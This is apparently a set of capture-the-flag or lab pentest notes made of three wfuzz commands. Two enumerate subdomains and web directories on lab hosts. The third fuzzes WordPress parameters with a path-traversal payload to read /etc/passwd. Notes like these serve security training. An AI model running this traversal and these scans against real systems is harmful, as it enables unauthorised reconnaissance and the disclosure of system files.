wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 400,404,403,302 -H "Host: FUZZ.hidden.lab" -u http://hidden.lab -t 100 


wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.66.79:5000/FUZZ

```
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 172.18.0.2/wordpress/index.php'?'FUZZ=../../../../../../../etc/passwd --hc 404 --hl 40
```

